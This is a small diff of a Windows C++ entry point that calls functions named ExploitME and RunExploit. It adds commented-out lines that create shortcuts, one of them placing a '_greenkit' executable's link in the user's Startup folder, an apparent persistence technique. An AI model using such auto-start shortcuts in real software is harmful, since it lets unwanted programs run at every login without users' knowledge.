@@ -27,8 +27,15 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	UNREFERENCED_PARAMETER(lpCmdLine);
 
  	// TODO: Place code here.
+	//%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_greenkit_GreentKitExe.lnk");
 
 	ExploitME();
+	Sleep(1000);
+	//wchar_t pathobj[MAX_PATH];
+	//mbstowcs(pathobj, "%userprofile%\\Documents\\HAHA.txt", MAX_PATH);//"%userprofile%\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe", MAX_PATH);
+	//CreateLink(pathobj, "C:\\yolo.lnk", NULL);
+	//CreateDesktopShortcut("yolo", "%userprofile%\\Documents\\HAHA.txt");//"%userprofile%\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe");
+	//create_shortcut("%userprofile%\\Documents\\HAHA.txt", "%userprofile%\\Documents\\coucou.lnk");
 	Sleep(1000);
 	RunExploit();
 
